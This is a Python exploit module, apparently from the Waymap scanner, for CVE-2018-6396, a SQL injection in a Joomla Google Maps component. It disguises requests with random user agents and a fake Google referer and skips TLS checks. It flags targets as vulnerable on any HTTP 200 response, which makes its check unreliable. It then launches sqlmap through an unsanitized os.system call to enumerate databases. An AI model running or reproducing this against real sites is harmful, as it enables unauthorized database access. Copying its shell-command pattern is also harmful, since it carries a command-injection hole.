# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2018-6396

import os
import random
import requests
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    WHITE = '\033[37m'

class UserAgent:
    agent = {}

    def random(self):
        self.get_platform()
        self.get_os()
        self.get_browser()

        if self.agent['browser'] == 'Chrome':
            webkit = str(random.randint(500, 599))
            version = "%s.0%s.%s" % (str(random.randint(0, 24)), str(random.randint(0, 1500)), str(random.randint(0, 999)))
            return f"Mozilla/5.0 ({self.agent['os']}) AppleWebKit/{webkit}.0 (KHTML, like Gecko) Chrome/{version} Safari/{webkit}"
        elif self.agent['browser'] == 'Firefox':
            year = str(random.randint(2000, 2015))
            month = str(random.randint(1, 12)).zfill(2)
            day = str(random.randint(1, 28)).zfill(2)
            gecko = f"{year}{month}{day}"
            version = f"{str(random.randint(1, 15))}.0"
            return f"Mozilla/5.0 ({self.agent['os']}; rv:{version}) Gecko/{gecko} Firefox/{version}"
        elif self.agent['browser'] == 'IE':
            version = f"{str(random.randint(1, 10))}.0"
            engine = f"{str(random.randint(1, 5))}.0"
            token = random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) if random.choice([True, False]) else ''
            return f"Mozilla/5.0 (compatible; MSIE {version}; {self.agent['os']}; {token} Trident/{engine})"

    def get_os(self):
        if self.agent['platform'] == 'Machintosh':
            self.agent['os'] = random.choice(['68K', 'PPC'])
        elif self.agent['platform'] == 'Windows':
            self.agent['os'] = random.choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win95', 'Win98', 'Win 9x 4.90', 'WindowsCE'])
        elif self.agent['platform'] == 'X11':
            self.agent['os'] = random.choice(['Linux i686', 'Linux x86_64'])

    def get_browser(self):
        self.agent['browser'] = random.choice(['Chrome', 'Firefox', 'IE'])

    def get_platform(self):
        self.agent['platform'] = random.choice(['Machintosh', 'Windows', 'X11'])

UA = UserAgent()
P = "/index.php?option=com_gmap&view=gm_modal&tmpl=component&layout=default&map=1"


def randomString(size):
    return ''.join(chr(random.randint(65, 90)) for _ in range(size))

def isVulnerable(profile_url):
    global UA
    url = urljoin(profile_url, P)

    headers = {
        'User-Agent': UA.random(),
        'Cache-Control': 'no-cache',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Referer': 'http://www.google.com/?q=' + randomString(random.randint(5, 10)),
        'Keep-Alive': str(random.randint(110, 120)),
        'Connection': 'keep-alive'
    }

    print(Colors.BOLD + Colors.GREEN + f"[+]" + " Checking if " + Colors.YELLOW + profile_url + Colors.GREEN + " is vulnerable" + Colors.ENDC)
    
    try:
        response = requests.get(url, headers=headers, timeout=10, verify=False)
        if response.status_code == 200:
            return True
    except Exception as e:
        print(f"{Colors.RED}Error: {str(e)}{Colors.ENDC}")
    
    return False

def scan_cve_2018_6396(profile_url):

    if isVulnerable(profile_url):
        print(Colors.BOLD + Colors.GREEN + "[+]" + " TARGET " + Colors.YELLOW + profile_url + Colors.GREEN + " VULNERABLE!! :)" + Colors.ENDC)
        print(Colors.BOLD + Colors.GREEN + "[+]" + " LAUNCHING ATTACK SQLi with SQLmap!!" + Colors.ENDC)
        exploit_command = f'sqlmap -u "{profile_url + P}" -p map --dbs'
        os.system(exploit_command)
        return True
    else:
        print(Colors.BOLD + Colors.RED + "[-]" + " TARGET " + Colors.YELLOW + profile_url + Colors.RED + " NOT VULNERABLE!! :(" + Colors.ENDC)
        return False

